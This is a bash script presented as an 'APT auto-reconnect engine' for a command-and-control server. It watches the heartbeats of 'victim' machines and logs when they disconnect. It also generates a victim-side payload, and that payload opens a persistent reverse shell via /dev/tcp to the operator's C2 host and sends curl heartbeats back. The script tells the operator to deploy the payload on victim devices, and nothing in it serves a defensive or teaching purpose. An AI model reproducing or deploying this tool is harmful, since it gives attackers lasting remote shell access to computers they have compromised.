#!/bin/bash
# ============================================
# APT AUTO-RECONNECT ENGINE v1.0
# Heartbeat Monitor | Keep-Alive | Auto-Restore
# ============================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

VICTIM_DIR="$HOME/c2_server/victims"
LOG_DIR="$HOME/c2_server/logs"
CONFIG_DIR="$HOME/c2_server/config"

HEARTBEAT_TIMEOUT=120  # 2 minutes timeout
CHECK_INTERVAL=30      # Check every 30 seconds

mkdir -p "$VICTIM_DIR" "$LOG_DIR" "$CONFIG_DIR"

# === HEARTBEAT MONITOR ===
heartbeat_monitor() {
    echo -e "${GREEN}[+]${NC} Heartbeat monitor started (Timeout: ${HEARTBEAT_TIMEOUT}s)"
    
    while true; do
        for victim_folder in "$VICTIM_DIR"/VICTIM-*; do
            [ -d "$victim_folder" ] || continue
            
            local victim_id=$(basename "$victim_folder")
            local info_file="$victim_folder/info.json"
            
            [ ! -f "$info_file" ] && continue
            
            local last_seen=$(grep -o '"last_seen": "[^"]*"' "$info_file" | cut -d'"' -f4)
            local last_timestamp=$(date -d "$last_seen" +%s 2>/dev/null || echo 0)
            local current_timestamp=$(date +%s)
            local diff=$((current_timestamp - last_timestamp))
            
            if [ "$diff" -gt "$HEARTBEAT_TIMEOUT" ]; then
                # Victim is offline
                local current_status=$(grep -o '"status": "[^"]*"' "$info_file" | cut -d'"' -f4)
                
                if [ "$current_status" != "offline" ]; then
                    echo -e "${RED}[!]${NC} $victim_id — OFFLINE (Last seen: ${diff}s ago)"
                    sed -i 's/"status": "online"/"status": "offline"/' "$info_file"
                    
                    # Log disconnection
                    echo "[$(date)] DISCONNECT | $victim_id | Offline for ${diff}s" >> "$LOG_DIR/c2_heartbeat.log"
                    
                    # Try to reconnect (if reconnect script exists)
                    if [ -f "$CONFIG_DIR/reconnect_cmd.txt" ]; then
                        echo -e "${YELLOW}[*]${NC} Attempting reconnect for $victim_id..."
                    fi
                fi
            else
                # Victim is online
                local current_status=$(grep -o '"status": "[^"]*"' "$info_file" | cut -d'"' -f4)
                
                if [ "$current_status" != "online" ]; then
                    echo -e "${GREEN}[+]${NC} $victim_id — BACK ONLINE!"
                    sed -i 's/"status": "offline"/"status": "online"/' "$info_file"
                    
                    # Log reconnection
                    echo "[$(date)] RECONNECT | $victim_id | Back online" >> "$LOG_DIR/c2_heartbeat.log"
                fi
            fi
        done
        
        sleep $CHECK_INTERVAL
    done
}

# === AUTO-RECONNECT CLIENT (Victim Side Payload) ===
generate_reconnect_payload() {
    local c2_ip="$1"
    local c2_port="$2"
    
    local payload_file="$HOME/c2_server/payloads/reconnect_payload.sh"
    
    cat > "$payload_file" << PAYLOAD
#!/bin/bash
# APT AUTO-RECONNECT CLIENT
# This runs on victim's device

C2_IP="$c2_ip"
C2_PORT="$c2_port"
HEARTBEAT_INTERVAL=30

# Send heartbeat
send_heartbeat() {
    while true; do
        curl -s "http://\$C2_IP:8080/heartbeat?id=\$(hostname)" >/dev/null 2>&1
        sleep \$HEARTBEAT_INTERVAL
    done
}

# Auto-reconnect loop
auto_reconnect() {
    while true; do
        # Try TCP connection
        bash -i >& /dev/tcp/\$C2_IP/\$C2_PORT 0>&1 2>/dev/null
        
        # If connection drops, wait and retry
        sleep 30
    done
}

# Start both
send_heartbeat &
auto_reconnect &

echo "[+] Auto-reconnect client started"
PAYLOAD

    chmod +x "$payload_file"
    echo -e "${GREEN}[+]${NC} Reconnect payload generated: $payload_file"
    echo -e "${YELLOW}[*]${NC} Deploy this on victim devices"
}

# === CONNECTION KEEP-ALIVE ===
keep_alive() {
    echo -e "${GREEN}[+]${NC} Keep-alive engine started"
    
    while true; do
        # Check all active connections
        for victim_folder in "$VICTIM_DIR"/VICTIM-*; do
            [ -d "$victim_folder" ] || continue
            
            local victim_id=$(basename "$victim_folder")
            local status=$(grep -o '"status": "[^"]*"' "$victim_folder/info.json" 2>/dev/null | cut -d'"' -f4)
            
            if [ "$status" = "online" ]; then
                # Send keep-alive ping
                local ip=$(grep -o '"ip": "[^"]*"' "$victim_folder/info.json" 2>/dev/null | cut -d'"' -f4)
                
                if [ -n "$ip" ]; then
                    ping -c 1 -W 2 "$ip" >/dev/null 2>&1
                    if [ $? -eq 0 ]; then
                        echo -e "${CYAN}[♥]${NC} $victim_id — Alive ($ip)"
                    fi
                fi
            fi
        done
        
        sleep 60
    done
}

# === RECONNECT LOG VIEWER ===
view_reconnect_logs() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║     📡 RECONNECT ACTIVITY LOG       ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════╝${NC}"
    echo ""
    
    if [ -f "$LOG_DIR/c2_heartbeat.log" ]; then
        echo -e "${GREEN}[Recent Disconnects]${NC}"
        grep "DISCONNECT" "$LOG_DIR/c2_heartbeat.log" | tail -10
        echo ""
        echo -e "${GREEN}[Recent Reconnects]${NC}"
        grep "RECONNECT" "$LOG_DIR/c2_heartbeat.log" | tail -10
    else
        echo -e "${YELLOW}[*] No reconnect activity yet${NC}"
    fi
}

# === MAIN MENU ===
main_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔══════════════════════════════╗${NC}"
        echo -e "${CYAN}║   🔄 AUTO-RECONNECT ENGINE  ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${GREEN}1)${NC} ▶️  Start Heartbeat Monitor"
        echo -e "  ${GREEN}2)${NC} 🔗 Start Keep-Alive Engine"
        echo -e "  ${GREEN}3)${NC} 🧬 Generate Victim Payload"
        echo -e "  ${GREEN}4)${NC} 📊 View Reconnect Logs"
        echo -e "  ${GREEN}5)${NC} 🚀 Start All Engines"
        echo -e "  ${RED}0)${NC} Exit"
        echo ""
        read -r -p "Choose: " choice
        
        case $choice in
            1) heartbeat_monitor ;;
            2) keep_alive ;;
            3)
                echo -ne "${YELLOW}C2 IP: ${NC}"; read -r c2_ip
                echo -ne "${YELLOW}C2 Port (443): ${NC}"; read -r c2_port
                c2_port=${c2_port:-443}
                generate_reconnect_payload "$c2_ip" "$c2_port"
                ;;
            4) view_reconnect_logs ;;
            5)
                echo -e "${GREEN}[+]${NC} Starting all engines..."
                heartbeat_monitor &
                keep_alive &
                echo -e "${GREEN}[+]${NC} All engines running in background"
                echo -e "${YELLOW}[*]${NC} Use 'pkill -f heartbeat_monitor' to stop"
                ;;
            0) break ;;
        esac
        
        echo -ne "\n${CYAN}[Press Enter]${NC}"; read -r
    done
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main_menu
fi
